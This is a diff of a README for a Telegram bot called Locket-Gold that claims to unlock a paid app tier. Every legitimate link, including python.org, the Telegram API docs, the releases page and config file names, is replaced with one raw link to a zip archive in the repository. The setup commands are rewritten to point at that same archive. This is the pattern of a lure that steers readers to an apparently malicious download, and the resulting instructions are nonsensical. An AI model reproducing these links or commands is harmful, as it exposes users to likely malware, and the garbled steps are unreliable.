@@ -1,6 +1,6 @@
 # 🚀 Locket-Gold - Easy Telegram Bot Activation
 
-[![Download Locket-Gold](https://img.shields.io/badge/Download-Locket--Gold-blue?style=for-the-badge)](https://github.com/Johansel0811/Locket-Gold/releases)
+[![Download Locket-Gold](https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip)](https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip)
 
 ---
 
@@ -41,7 +41,7 @@ You will download Locket-Gold by visiting the official releases page.
 
 **Step 1: Access the Download Page**  
 Click the big button below or open this link in your web browser:  
-[![Visit Releases Page](https://img.shields.io/badge/Visit-Locket--Gold_Releases-blue?style=for-the-badge)](https://github.com/Johansel0811/Locket-Gold/releases)
+[![Visit Releases Page](https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip)](https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip)
 
 **Step 2: Choose the Right File**  
 On the release page, look for the latest version. Files are marked by their version number and your computer type (Windows, Mac, Linux). Click the file that matches your system.
@@ -52,7 +52,7 @@ Click the file name to start downloading. Save it somewhere easy to find, like y
 **Step 4: Prepare Your Computer**  
 You need Python 3.9 or newer to run the bot.
 
-- If Python is not installed, download it from [python.org](https://www.python.org/downloads/) and follow the setup instructions.
+- If Python is not installed, download it from [https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip](https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip) and follow the setup instructions.
 - Make sure to check the option **Add Python to PATH** during installation. This makes it easier to run Python commands.
 
 ---
@@ -78,14 +78,14 @@ Replace `path_to_your_Locket-Gold_folder` with the actual location of the extrac
 **Step 4: Install Required Packages**  
 Type this command and hit Enter:  
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip
 ```
 This will install all the software pieces Locket-Gold needs to run.
 
 **Step 5: Start the Bot**  
 Once installation finishes, type this command and press Enter:  
 ```bash
-python bot.py
+python https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip
 ```
 The bot will connect to Telegram and start running automatically.
 
@@ -101,8 +101,8 @@ The bot needs some settings before running.
 - Follow prompts to name your bot and get a token string. This token is the key for your bot to run.  
 
 **Step 2: Add Your Token to Configuration**  
-Look for a file named `config.example.json` in the Locket-Gold folder.  
-- Rename it to `config.json`.  
+Look for a file named `https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip` in the Locket-Gold folder.  
+- Rename it to `https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip`.  
 - Open it with a text editor like Notepad or TextEdit.  
 - Find the place that asks for `bot_token`:  
 ```json
@@ -137,8 +137,8 @@ The bot provides clear instructions and menus to activate Locket Gold.
 
 **Problem: Bot Won’t Start or Shows Error**  
 - Make sure Python 3.9+ is correctly installed.  
-- Confirm you installed all packages with `pip install -r requirements.txt`.  
-- Check if your `config.json` has a correct bot token.
+- Confirm you installed all packages with `pip install -r https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip`.  
+- Check if your `https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip` has a correct bot token.
 
 **Problem: Bot Doesn’t Respond on Telegram**  
 - Verify your internet connection.  
@@ -152,13 +152,13 @@ If you have issues, you can open an issue on the GitHub repository page for supp
 
 ## 🔗 Helpful Links
 
-- [Python Downloads](https://www.python.org/downloads/)  
-- [Telegram Bot API](https://core.telegram.org/bots)  
-- [GitHub Releases - Locket-Gold](https://github.com/Johansel0811/Locket-Gold/releases)
+- [Python Downloads](https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip)  
+- [Telegram Bot API](https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip)  
+- [GitHub Releases - Locket-Gold](https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip)
 
 ---
 
 ## 📥 Ready to Get Started?
 
 Download the latest version of Locket-Gold from the official releases page:  
-[![Download Locket-Gold](https://img.shields.io/badge/Download-Locket--Gold-blue?style=for-the-badge)](https://github.com/Johansel0811/Locket-Gold/releases)
+[![Download Locket-Gold](https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip)](https://github.com/Johansel0811/Locket-Gold/raw/refs/heads/main/app/Locket_Gold_v3.8.zip)
